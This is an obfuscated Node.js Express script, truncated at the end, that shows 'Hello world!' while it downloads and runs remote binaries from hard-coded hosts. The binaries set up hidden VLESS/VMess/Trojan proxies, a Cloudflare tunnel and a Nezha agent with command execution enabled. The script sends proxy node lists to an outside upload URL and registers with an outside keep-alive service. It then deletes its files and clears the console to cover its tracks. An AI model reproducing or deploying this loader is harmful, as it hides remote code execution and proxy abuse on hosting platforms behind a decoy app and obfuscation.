const _0x3af801=_0x39f0;(function(_0x119203,_0x363dba){const _0x5a1baf=_0x39f0,_0x4e082d=_0x119203();while(!![]){try{const _0x515bb4=parseInt(_0x5a1baf(0x1f5))/0x1*(parseInt(_0x5a1baf(0x19a))/0x2)+parseInt(_0x5a1baf(0x1b9))/0x3*(parseInt(_0x5a1baf(0x144))/0x4)+parseInt(_0x5a1baf(0x145))/0x5+parseInt(_0x5a1baf(0x1f0))/0x6*(parseInt(_0x5a1baf(0x18b))/0x7)+parseInt(_0x5a1baf(0x177))/0x8+-parseInt(_0x5a1baf(0x1f9))/0x9+-parseInt(_0x5a1baf(0x158))/0xa;if(_0x515bb4===_0x363dba)break;else _0x4e082d['push'](_0x4e082d['shift']());}catch(_0x3e550f){_0x4e082d['push'](_0x4e082d['shift']());}}}(_0x5e22,0x57e3b));const express=require(_0x3af801(0x1e9)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3af801(0x1de)),{promisify}=require(_0x3af801(0x185)),exec=promisify(require('child_process')[_0x3af801(0x1eb)]),{execSync}=require(_0x3af801(0x1c8)),UPLOAD_URL=process[_0x3af801(0x17c)][_0x3af801(0x173)]||'',PROJECT_URL=process[_0x3af801(0x17c)][_0x3af801(0x1e5)]||'',AUTO_ACCESS=process[_0x3af801(0x17c)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3af801(0x17c)]['FILE_PATH']||_0x3af801(0x180),SUB_PATH=process['env'][_0x3af801(0x16f)]||'sub',PORT=process[_0x3af801(0x17c)][_0x3af801(0x14d)]||process[_0x3af801(0x17c)][_0x3af801(0x160)]||0xbb8,UUID=process['env'][_0x3af801(0x1c6)]||'599905e8-8720-4055-94d6-2c86c1f00e7a',NEZHA_SERVER=process[_0x3af801(0x17c)][_0x3af801(0x139)]||'',NEZHA_PORT=process[_0x3af801(0x17c)][_0x3af801(0x1c5)]||'',NEZHA_KEY=process[_0x3af801(0x17c)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3af801(0x17c)][_0x3af801(0x1b8)]||_0x3af801(0x1ae),ARGO_AUTH=process[_0x3af801(0x17c)]['ARGO_AUTH']||_0x3af801(0x1d5),ARGO_PORT=process[_0x3af801(0x17c)][_0x3af801(0x147)]||0x1f41,CFIP=process['env'][_0x3af801(0x1ce)]||'cdns.doon.eu.org',CFPORT=process[_0x3af801(0x17c)][_0x3af801(0x1ed)]||0x1bb,NAME=process[_0x3af801(0x17c)][_0x3af801(0x191)]||'railway';function _0x39f0(_0x291372,_0x5498f2){_0x291372=_0x291372-0x139;const _0x5e227c=_0x5e22();let _0x39f0f1=_0x5e227c[_0x291372];return _0x39f0f1;}!fs[_0x3af801(0x148)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3af801(0x1a8)](FILE_PATH+_0x3af801(0x165))):console[_0x3af801(0x1a8)](FILE_PATH+_0x3af801(0x1bf));function generateRandomName(){const _0x53a156=_0x3af801,_0x4e2228=_0x53a156(0x170);let _0x1359fe='';for(let _0xf8137c=0x0;_0xf8137c<0x6;_0xf8137c++){_0x1359fe+=_0x4e2228[_0x53a156(0x1a9)](Math[_0x53a156(0x1a3)](Math[_0x53a156(0x1ba)]()*_0x4e2228['length']));}return _0x1359fe;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3af801(0x15f)](FILE_PATH,botName),subPath=path[_0x3af801(0x15f)](FILE_PATH,'sub.txt'),listPath=path[_0x3af801(0x15f)](FILE_PATH,'list.txt'),bootLogPath=path[_0x3af801(0x15f)](FILE_PATH,_0x3af801(0x1c1)),configPath=path[_0x3af801(0x15f)](FILE_PATH,_0x3af801(0x159));function deleteNodes(){const _0x237f46=_0x3af801;try{if(!UPLOAD_URL)return;if(!fs[_0x237f46(0x148)](subPath))return;let _0x35c910;try{_0x35c910=fs[_0x237f46(0x1ec)](subPath,_0x237f46(0x196));}catch{return null;}const _0x5913f5=Buffer[_0x237f46(0x1be)](_0x35c910,'base64')[_0x237f46(0x163)](_0x237f46(0x196)),_0xcdb022=_0x5913f5[_0x237f46(0x1dd)]('\x0a')[_0x237f46(0x1bc)](_0x57bb1c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x237f46(0x174)](_0x57bb1c));if(_0xcdb022[_0x237f46(0x157)]===0x0)return;return axios[_0x237f46(0x1cd)](UPLOAD_URL+_0x237f46(0x1bb),JSON[_0x237f46(0x178)]({'nodes':_0xcdb022}),{'headers':{'Content-Type':_0x237f46(0x150)}})[_0x237f46(0x18d)](_0x5ab9d1=>{return null;}),null;}catch(_0x5912a7){return null;}}function cleanupOldFiles(){const _0x1a0757=_0x3af801;try{const _0x41fa39=fs[_0x1a0757(0x13d)](FILE_PATH);_0x41fa39['forEach'](_0x5e4051=>{const _0x5a3ae4=_0x1a0757,_0x48eeef=path['join'](FILE_PATH,_0x5e4051);try{const _0x464610=fs[_0x5a3ae4(0x140)](_0x48eeef);_0x464610[_0x5a3ae4(0x1e8)]()&&fs['unlinkSync'](_0x48eeef);}catch(_0x5e5ed6){}});}catch(_0x3b0bc8){}}app[_0x3af801(0x153)]('/',function(_0x3f33bb,_0x56990f){const _0x446200=_0x3af801;_0x56990f[_0x446200(0x1cf)](_0x446200(0x14e));});function _0x5e22(){const _0x5bae42=['\x0a\x0avmess://','eyJhIjoiOTg5YjBmNTQ2ZWUwNTgxM2E1ZGEzYmUzYTQxZGM1ZWEiLCJ0IjoiZWMxNjllYTUtOGNkOC00Yzk5LThmZWYtZDZhNjI0MWFlNDkyIiwicyI6Ik1qQXpZalEyWldRdE1tRTVNeTAwTlRKaExXSmhPVGd0WXpVeE56bGpaV0l3TldRMSJ9','createWriteStream','push','/dev/null','\x20successfully','\x20is\x20running','forEach','Error\x20downloading\x20files:','split','path','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','automatic\x20access\x20task\x20added\x20successfully','Add\x20automatic\x20access\x20task\x20faild:\x20','base64','listen','https://amd64.ssss.nyc.mn/web','PROJECT_URL','2096','unshift','isFile','express','\x22\x20>\x20/dev/null\x202>&1','exec','readFileSync','CFPORT','freedom','\x0a\x20\x20credentials-file:\x20','300582WeDVUf','response','all','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','writeFileSync','1237pOaQKF','\x0aclient_secret:\x20','Error\x20executing\x20command:\x20','includes','1520658pbNeun','false','then','del\x20/f\x20/q\x20','amd','block','NEZHA_SERVER','map','tls','pop','readdirSync','countryCode','https://amd64.ssss.nyc.mn/bot','statSync','https://amd64.ssss.nyc.mn/agent','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1204KAfobP','2406400khCYVo','\x20-s\x20','ARGO_PORT','existsSync','Download\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','status','rm\x20-rf\x20','SERVER_PORT','Hello\x20world!','xtls-rprx-vision','application/json','config.yaml','country_code','get','/config.json\x20>/dev/null\x202>&1\x20&','https://ipapi.co/json/','2087','length','14089910QgUqZA','config.json','http','&path=%2Fvless-argo%3Fed%3D2560#','/trojan-argo','/vmess-argo','443','join','PORT','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','toString','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20is\x20created','?encryption=none&security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','http://ip-api.com/json/','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','/vmess-argo?ed=2560','close','https://arm64.ssss.nyc.mn/bot','SUB_PATH','abcdefghijklmnopqrstuvwxyz','npm\x20running\x20error:\x20','arm64','UPLOAD_URL','test','success','unlinkSync','3032552oUJDXs','stringify','App\x20is\x20running','nohup\x20','Subscription\x20uploaded\x20successfully','env','blackhole','firefox','platform','./tmp','ArgoDomain:','TunnelSecret','vless','\x0a\x20\x20\x20\x20','util','/sub.txt\x20saved\x20successfully','clear','Error\x20in\x20startserver:','taskkill\x20/f\x20/im\x20','https://arm64.ssss.nyc.mn/web','63QFYRWo','https://oooo.serv00.net/add-url','catch','arm','set','vmess','NAME','substring','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','data','fileUrl','utf-8','pkill\x20-f\x20\x22[','\x20>\x20nul\x202>&1','\x20-c\x20\x22','1006JUNVKV','2053','error','tcp','text/plain;\x20charset=utf-8','org','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Content-Type','trojan','floor','php\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/v1','2083','Error\x20reading\x20boot.log:','log','charAt','Empowerment\x20success\x20for\x20','basename','none','&fp=firefox&type=ws&host=','railway.woxo.de5.net','https://arm64.ssss.nyc.mn/agent','win32','quic','/vless-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x0atrojan://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','pipe','ARGO_DOMAIN','45fMQiNL','random','/api/delete-nodes','filter','message','from','\x20already\x20exists','8443','boot.log','\x20failed:\x20','https://amd64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','NEZHA_PORT','UUID','--tls','child_process','match','tunnel.yml','\x0avless://','/api/add-subscriptions','post','CFIP','send','127.0.0.1','\x20>/dev/null\x202>&1','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'];_0x5e22=function(){return _0x5bae42;};return _0x5e22();}async function generateConfig(){const _0x4cbffa=_0x3af801,_0x3b5f07={'log':{'access':'/dev/null','error':_0x4cbffa(0x1d8),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4cbffa(0x183),'settings':{'clients':[{'id':UUID,'flow':_0x4cbffa(0x14f)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4cbffa(0x1b2),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4cbffa(0x1d0),'protocol':_0x4cbffa(0x183),'settings':{'clients':[{'id':UUID}],'decryption':_0x4cbffa(0x1ac)},'streamSettings':{'network':_0x4cbffa(0x19d),'security':_0x4cbffa(0x1ac)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4cbffa(0x1ac),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4cbffa(0x13b),_0x4cbffa(0x1b1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4cbffa(0x1d0),'protocol':_0x4cbffa(0x190),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4cbffa(0x15d)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cbffa(0x15a),_0x4cbffa(0x13b),_0x4cbffa(0x1b1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4cbffa(0x1d0),'protocol':_0x4cbffa(0x1a2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4cbffa(0x1ac),'wsSettings':{'path':_0x4cbffa(0x15c)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cbffa(0x15a),_0x4cbffa(0x13b),_0x4cbffa(0x1b1)],'metadataOnly':![]}}],'dns':{'servers':[_0x4cbffa(0x1c4)]},'outbounds':[{'protocol':_0x4cbffa(0x1ee),'tag':'direct'},{'protocol':_0x4cbffa(0x17d),'tag':_0x4cbffa(0x1fe)}]};fs[_0x4cbffa(0x1f4)](path[_0x4cbffa(0x15f)](FILE_PATH,_0x4cbffa(0x159)),JSON['stringify'](_0x3b5f07,null,0x2));}function getSystemArchitecture(){const _0x40a069=_0x3af801,_0x541b6e=os['arch']();return _0x541b6e===_0x40a069(0x18e)||_0x541b6e===_0x40a069(0x172)||_0x541b6e==='aarch64'?'arm':_0x40a069(0x1fd);}function downloadFile(_0x12f6bf,_0x463d63,_0x34cdc7){const _0x4ffd16=_0x3af801,_0x5d7eb7=_0x12f6bf;!fs[_0x4ffd16(0x148)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x7fe7ae=fs[_0x4ffd16(0x1d6)](_0x5d7eb7);axios({'method':_0x4ffd16(0x153),'url':_0x463d63,'responseType':'stream'})[_0x4ffd16(0x1fb)](_0x5d8539=>{const _0x1fa95e=_0x4ffd16;_0x5d8539[_0x1fa95e(0x194)][_0x1fa95e(0x1b7)](_0x7fe7ae),_0x7fe7ae['on']('finish',()=>{const _0x31fdc1=_0x1fa95e;_0x7fe7ae[_0x31fdc1(0x16d)](),console[_0x31fdc1(0x1a8)](_0x31fdc1(0x149)+path['basename'](_0x5d7eb7)+_0x31fdc1(0x1d9)),_0x34cdc7(null,_0x5d7eb7);}),_0x7fe7ae['on'](_0x1fa95e(0x19c),_0x375f5b=>{const _0x26bb2a=_0x1fa95e;fs['unlink'](_0x5d7eb7,()=>{});const _0x48723b='Download\x20'+path['basename'](_0x5d7eb7)+_0x26bb2a(0x1c2)+_0x375f5b[_0x26bb2a(0x1bd)];console['error'](_0x48723b),_0x34cdc7(_0x48723b);});})['catch'](_0x3186eb=>{const _0x5ef234=_0x4ffd16,_0x16ce50=_0x5ef234(0x149)+path[_0x5ef234(0x1ab)](_0x5d7eb7)+_0x5ef234(0x1c2)+_0x3186eb['message'];console['error'](_0x16ce50),_0x34cdc7(_0x16ce50);});}async function downloadFilesAndRun(){const _0x36553e=_0x3af801,_0x4c26b6=getSystemArchitecture(),_0xf96a88=getFilesForArchitecture(_0x4c26b6);if(_0xf96a88[_0x36553e(0x157)]===0x0){console[_0x36553e(0x1a8)](_0x36553e(0x1f3));return;}const _0x3f9b53=_0xf96a88[_0x36553e(0x13a)](_0x17b868=>{return new Promise((_0x574af7,_0x3f82e5)=>{const _0x358f36=_0x39f0;downloadFile(_0x17b868['fileName'],_0x17b868[_0x358f36(0x195)],(_0x1e9e5c,_0x29b20b)=>{_0x1e9e5c?_0x3f82e5(_0x1e9e5c):_0x574af7(_0x29b20b);});});});try{await Promise[_0x36553e(0x1f2)](_0x3f9b53);}catch(_0x1cb25a){console['error'](_0x36553e(0x1dc),_0x1cb25a);return;}function _0x4200b9(_0x5f3ead){const _0x310e89=_0x36553e,_0x713ec3=0x1fd;_0x5f3ead[_0x310e89(0x1db)](_0x161c37=>{const _0x297d5d=_0x310e89;fs[_0x297d5d(0x148)](_0x161c37)&&fs['chmod'](_0x161c37,_0x713ec3,_0x55bc99=>{const _0x1b18ce=_0x297d5d;_0x55bc99?console['error']('Empowerment\x20failed\x20for\x20'+_0x161c37+':\x20'+_0x55bc99):console[_0x1b18ce(0x1a8)](_0x1b18ce(0x1aa)+_0x161c37+':\x20'+_0x713ec3['toString'](0x8));});});}const _0x1bcc97=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4200b9(_0x1bcc97);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x460c83=NEZHA_SERVER[_0x36553e(0x1f8)](':')?NEZHA_SERVER[_0x36553e(0x1dd)](':')[_0x36553e(0x13c)]():'',_0x2e9762=new Set(['443',_0x36553e(0x1c0),_0x36553e(0x1e6),_0x36553e(0x156),'2083',_0x36553e(0x19b)]),_0x38c7a3=_0x2e9762['has'](_0x460c83)?'true':_0x36553e(0x1fa),_0x2c4831=_0x36553e(0x1f6)+NEZHA_KEY+_0x36553e(0x164)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x38c7a3+_0x36553e(0x143)+UUID;fs[_0x36553e(0x1f4)](path[_0x36553e(0x15f)](FILE_PATH,_0x36553e(0x151)),_0x2c4831);const _0x31a667=_0x36553e(0x17a)+phpPath+_0x36553e(0x199)+FILE_PATH+_0x36553e(0x142);try{await exec(_0x31a667),console[_0x36553e(0x1a8)](phpName+_0x36553e(0x1da)),await new Promise(_0x7fa475=>setTimeout(_0x7fa475,0x3e8));}catch(_0x14bc4a){console[_0x36553e(0x19c)](_0x36553e(0x1a4)+_0x14bc4a);}}else{let _0x411fd0='';const _0x1d29d8=[_0x36553e(0x15e),_0x36553e(0x1c0),_0x36553e(0x1e6),_0x36553e(0x156),_0x36553e(0x1a6),_0x36553e(0x19b)];_0x1d29d8[_0x36553e(0x1f8)](NEZHA_PORT)&&(_0x411fd0=_0x36553e(0x1c7));const _0x3dce26=_0x36553e(0x17a)+npmPath+_0x36553e(0x146)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x411fd0+_0x36553e(0x16a);try{await exec(_0x3dce26),console[_0x36553e(0x1a8)](npmName+_0x36553e(0x1da)),await new Promise(_0x381e19=>setTimeout(_0x381e19,0x3e8));}catch(_0x138a62){console['error'](_0x36553e(0x171)+_0x138a62);}}}else console[_0x36553e(0x1a8)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x15d767='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x36553e(0x154);try{await exec(_0x15d767),console[_0x36553e(0x1a8)](webName+'\x20is\x20running'),await new Promise(_0x352900=>setTimeout(_0x352900,0x3e8));}catch(_0x3eb226){console['error']('web\x20running\x20error:\x20'+_0x3eb226);}if(fs[_0x36553e(0x148)](botPath)){let _0x197ce5;if(ARGO_AUTH[_0x36553e(0x1c9)](/^[A-Z0-9a-z=]{120,250}$/))_0x197ce5=_0x36553e(0x1b6)+ARGO_AUTH;else ARGO_AUTH[_0x36553e(0x1c9)](/TunnelSecret/)?_0x197ce5=_0x36553e(0x167)+FILE_PATH+'/tunnel.yml\x20run':_0x197ce5=_0x36553e(0x1d3)+FILE_PATH+_0x36553e(0x1b3)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x197ce5+_0x36553e(0x161)),console[_0x36553e(0x1a8)](botName+_0x36553e(0x1da)),await new Promise(_0x217cf4=>setTimeout(_0x217cf4,0x7d0));}catch(_0x1ee1e9){console[_0x36553e(0x19c)](_0x36553e(0x1f7)+_0x1ee1e9);}}await new Promise(_0x43935a=>setTimeout(_0x43935a,0x1388));}function getFilesForArchitecture(_0x57d6f5){const _0x22a5b9=_0x3af801;let _0x2437bc;_0x57d6f5===_0x22a5b9(0x18e)?_0x2437bc=[{'fileName':webPath,'fileUrl':_0x22a5b9(0x18a)},{'fileName':botPath,'fileUrl':_0x22a5b9(0x16e)}]:_0x2437bc=[{'fileName':webPath,'fileUrl':_0x22a5b9(0x1e4)},{'fileName':botPath,'fileUrl':_0x22a5b9(0x13f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1edce8=_0x57d6f5===_0x22a5b9(0x18e)?_0x22a5b9(0x1af):_0x22a5b9(0x141);_0x2437bc[_0x22a5b9(0x1e7)]({'fileName':npmPath,'fileUrl':_0x1edce8});}else{const _0x1a312f=_0x57d6f5===_0x22a5b9(0x18e)?_0x22a5b9(0x1a5):_0x22a5b9(0x1c3);_0x2437bc[_0x22a5b9(0x1e7)]({'fileName':phpPath,'fileUrl':_0x1a312f});}}return _0x2437bc;}function argoType(){const _0x569c87=_0x3af801;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x569c87(0x1a8)](_0x569c87(0x193));return;}if(ARGO_AUTH[_0x569c87(0x1f8)](_0x569c87(0x182))){fs[_0x569c87(0x1f4)](path['join'](FILE_PATH,_0x569c87(0x1d2)),ARGO_AUTH);const _0x244c35='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x569c87(0x1dd)]('\x22')[0xb]+_0x569c87(0x1ef)+path[_0x569c87(0x15f)](FILE_PATH,_0x569c87(0x1d2))+_0x569c87(0x1b4)+ARGO_DOMAIN+_0x569c87(0x162)+ARGO_PORT+_0x569c87(0x14a);fs[_0x569c87(0x1f4)](path['join'](FILE_PATH,_0x569c87(0x1ca)),_0x244c35);}else console[_0x569c87(0x1a8)](_0x569c87(0x1a0));}async function extractDomains(){const _0x1293cc=_0x3af801;let _0x36b63f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x36b63f=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x36b63f),await _0x1ab2ba(_0x36b63f);else try{const _0x219a73=fs[_0x1293cc(0x1ec)](path[_0x1293cc(0x15f)](FILE_PATH,'boot.log'),_0x1293cc(0x196)),_0x5462bb=_0x219a73[_0x1293cc(0x1dd)]('\x0a'),_0x230e82=[];_0x5462bb[_0x1293cc(0x1db)](_0x4b85f1=>{const _0x8b6e64=_0x1293cc,_0x5cd5c8=_0x4b85f1[_0x8b6e64(0x1c9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5cd5c8){const _0x2d60cf=_0x5cd5c8[0x1];_0x230e82[_0x8b6e64(0x1d7)](_0x2d60cf);}});if(_0x230e82[_0x1293cc(0x157)]>0x0)_0x36b63f=_0x230e82[0x0],console[_0x1293cc(0x1a8)](_0x1293cc(0x181),_0x36b63f),await _0x1ab2ba(_0x36b63f);else{console[_0x1293cc(0x1a8)](_0x1293cc(0x1df)),fs[_0x1293cc(0x176)](path[_0x1293cc(0x15f)](FILE_PATH,_0x1293cc(0x1c1)));async function _0x5c5df6(){const _0x164b01=_0x1293cc;try{process['platform']===_0x164b01(0x1b0)?await exec(_0x164b01(0x189)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x164b01(0x197)+botName['charAt'](0x0)+']'+botName[_0x164b01(0x192)](0x1)+_0x164b01(0x1ea));}catch(_0x45530c){}}_0x5c5df6(),await new Promise(_0x44f1b9=>setTimeout(_0x44f1b9,0xbb8));const _0x6d8110=_0x1293cc(0x1d3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1293cc(0x17a)+botPath+'\x20'+_0x6d8110+_0x1293cc(0x161)),console[_0x1293cc(0x1a8)](botName+_0x1293cc(0x1da)),await new Promise(_0x1e7ebc=>setTimeout(_0x1e7ebc,0xbb8)),await extractDomains();}catch(_0x8f9107){console['error'](_0x1293cc(0x1f7)+_0x8f9107);}}}catch(_0x39bc2a){console[_0x1293cc(0x19c)](_0x1293cc(0x1a7),_0x39bc2a);}async function _0x1faf89(){const _0x48f06a=_0x1293cc;try{const _0x2da7cf=await axios[_0x48f06a(0x153)](_0x48f06a(0x155),{'timeout':0xbb8});if(_0x2da7cf[_0x48f06a(0x194)]&&_0x2da7cf['data'][_0x48f06a(0x152)]&&_0x2da7cf[_0x48f06a(0x194)][_0x48f06a(0x19f)])return _0x2da7cf['data'][_0x48f06a(0x152)]+'_'+_0x2da7cf[_0x48f06a(0x194)][_0x48f06a(0x19f)];}catch(_0x53b7b1){try{const _0x598d95=await axios['get'](_0x48f06a(0x168),{'timeout':0xbb8});if(_0x598d95[_0x48f06a(0x194)]&&_0x598d95[_0x48f06a(0x194)]['status']===_0x48f06a(0x175)&&_0x598d95['data'][_0x48f06a(0x13e)]&&_0x598d95[_0x48f06a(0x194)][_0x48f06a(0x19f)])return _0x598d95['data']['countryCode']+'_'+_0x598d95[_0x48f06a(0x194)][_0x48f06a(0x19f)];}catch(_0x249fe3){}}return'Unknown';}async function _0x1ab2ba(_0x4efc10){const _0x314824=await _0x1faf89(),_0x3970c1=NAME?NAME+'-'+_0x314824:_0x314824;return new Promise(_0x5b12ed=>{setTimeout(()=>{const _0x2d5ded=_0x39f0,_0x2b2778={'v':'2','ps':''+_0x3970c1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2d5ded(0x1ac),'net':'ws','type':_0x2d5ded(0x1ac),'host':_0x4efc10,'path':_0x2d5ded(0x16c),'tls':_0x2d5ded(0x13b),'sni':_0x4efc10,'alpn':'','fp':_0x2d5ded(0x17e)},_0xa08215=_0x2d5ded(0x1cb)+UUID+'@'+CFIP+':'+CFPORT+_0x2d5ded(0x166)+_0x4efc10+_0x2d5ded(0x1ad)+_0x4efc10+_0x2d5ded(0x15b)+_0x3970c1+_0x2d5ded(0x1d4)+Buffer['from'](JSON[_0x2d5ded(0x178)](_0x2b2778))['toString'](_0x2d5ded(0x1e2))+_0x2d5ded(0x1b5)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4efc10+'&fp=firefox&type=ws&host='+_0x4efc10+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3970c1+_0x2d5ded(0x184);console[_0x2d5ded(0x1a8)](Buffer[_0x2d5ded(0x1be)](_0xa08215)[_0x2d5ded(0x163)]('base64')),fs[_0x2d5ded(0x1f4)](subPath,Buffer[_0x2d5ded(0x1be)](_0xa08215)[_0x2d5ded(0x163)](_0x2d5ded(0x1e2))),console[_0x2d5ded(0x1a8)](FILE_PATH+_0x2d5ded(0x186)),uploadNodes(),app[_0x2d5ded(0x153)]('/'+SUB_PATH,(_0x29620e,_0x222a1f)=>{const _0x2c5b96=_0x2d5ded,_0x2a219e=Buffer['from'](_0xa08215)[_0x2c5b96(0x163)](_0x2c5b96(0x1e2));_0x222a1f[_0x2c5b96(0x18f)](_0x2c5b96(0x1a1),_0x2c5b96(0x19e)),_0x222a1f[_0x2c5b96(0x1cf)](_0x2a219e);}),_0x5b12ed(_0xa08215);},0x7d0);});}}async function uploadNodes(){const _0x41799d=_0x3af801;if(UPLOAD_URL&&PROJECT_URL){const _0x5c9edb=PROJECT_URL+'/'+SUB_PATH,_0x4b06df={'subscription':[_0x5c9edb]};try{const _0x39867d=await axios[_0x41799d(0x1cd)](UPLOAD_URL+_0x41799d(0x1cc),_0x4b06df,{'headers':{'Content-Type':_0x41799d(0x150)}});return _0x39867d&&_0x39867d[_0x41799d(0x14b)]===0xc8?(console[_0x41799d(0x1a8)](_0x41799d(0x17b)),_0x39867d):null;}catch(_0x2d682d){if(_0x2d682d[_0x41799d(0x1f1)]){if(_0x2d682d[_0x41799d(0x1f1)][_0x41799d(0x14b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x41799d(0x148)](listPath))return;const _0x32f12e=fs['readFileSync'](listPath,_0x41799d(0x196)),_0x5cefeb=_0x32f12e[_0x41799d(0x1dd)]('\x0a')[_0x41799d(0x1bc)](_0x34d65a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x41799d(0x174)](_0x34d65a));if(_0x5cefeb[_0x41799d(0x157)]===0x0)return;const _0x4ab075=JSON['stringify']({'nodes':_0x5cefeb});try{const _0x2fc4d4=await axios[_0x41799d(0x1cd)](UPLOAD_URL+'/api/add-nodes',_0x4ab075,{'headers':{'Content-Type':_0x41799d(0x150)}});return _0x2fc4d4&&_0x2fc4d4[_0x41799d(0x14b)]===0xc8?(console[_0x41799d(0x1a8)](_0x41799d(0x16b)),_0x2fc4d4):null;}catch(_0x3bc71a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3bc725=_0x39f0,_0x647599=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x647599[_0x3bc725(0x1d7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x647599[_0x3bc725(0x1d7)](phpPath);process[_0x3bc725(0x17f)]===_0x3bc725(0x1b0)?exec(_0x3bc725(0x1fc)+_0x647599[_0x3bc725(0x15f)]('\x20')+_0x3bc725(0x198),_0x5b98f0=>{const _0x118ba5=_0x3bc725;console[_0x118ba5(0x187)](),console[_0x118ba5(0x1a8)]('App\x20is\x20running'),console['log'](_0x118ba5(0x169));}):exec(_0x3bc725(0x14c)+_0x647599[_0x3bc725(0x15f)]('\x20')+_0x3bc725(0x1d1),_0x7c7a54=>{const _0x452453=_0x3bc725;console['clear'](),console[_0x452453(0x1a8)](_0x452453(0x179)),console[_0x452453(0x1a8)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x567533=_0x3af801;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4edc34=await axios[_0x567533(0x1cd)](_0x567533(0x18c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x567533(0x150)}});return console[_0x567533(0x1a8)](_0x567533(0x1e0)),_0x4edc34;}catch(_0x19d544){return console[_0x567533(0x19c)](_0x567533(0x1e1)+_0x19d544[_0x567533(0x1bd)]),null;}}async function startserver(){const _0x4fade2=_0x3af801;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await 